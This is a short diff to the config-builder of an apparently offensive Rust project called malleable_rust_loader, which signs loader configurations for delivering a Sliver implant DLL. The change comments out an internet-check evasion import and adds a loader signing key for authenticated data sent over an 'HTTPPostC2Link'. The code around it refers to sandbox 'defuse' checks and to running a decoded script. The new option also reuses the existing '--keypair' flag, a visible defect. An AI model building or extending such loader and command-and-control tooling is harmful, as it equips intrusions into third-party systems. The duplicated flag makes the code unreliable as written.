@@ -2,7 +2,7 @@ extern crate argparse;
 
 use malleable_rust_loader::config::Config;
 use malleable_rust_loader::dataoperation::DataOperation;
-use malleable_rust_loader::defuse::CheckInternet;
+//use malleable_rust_loader::defuse::CheckInternet;
 use malleable_rust_loader::defuse::Defuse;
 use malleable_rust_loader::defuse::DomainJoin;
 use malleable_rust_loader::defuse::Hostname;
@@ -48,6 +48,7 @@ fn main() {
     let mut payload = "".to_string();
     let mut output: String = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
     let mut keypair: String = concat!(env!("HOME"), "/.malleable/ed25519.u8").to_string();
+    let mut loader_keypair: String = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
     let mut payload_dataope: String =
         concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
     {
@@ -63,6 +64,7 @@ fn main() {
             "config output path, default: /.malleable/config/initial.json",
         );
         ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
+        ap.refer(&mut loader_keypair).add_option(&["--keypair"], Store,"path of the loader private ed25519 key pair to send authenticated data with HTTPPostC2Link, default: ~/.malleable/config/ed25519.u8)");
         ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
         ap.refer(&mut link_timeout).add_option(&["--link-timeout"], Store,"global timeout for link");
         ap.refer(&mut link_user_agent).add_option(&["--link-user-agent"], Store,"global user-agent for link");
@@ -395,7 +397,8 @@ exec(decoded_script)
         1,
         0,
         link_timeout,
-        link_user_agent
+        link_user_agent,
+        fs::read(loader_keypair).unwrap()
     );
     //info!("{:?}", loaderconf);
     info!("[+] SIGN loader");
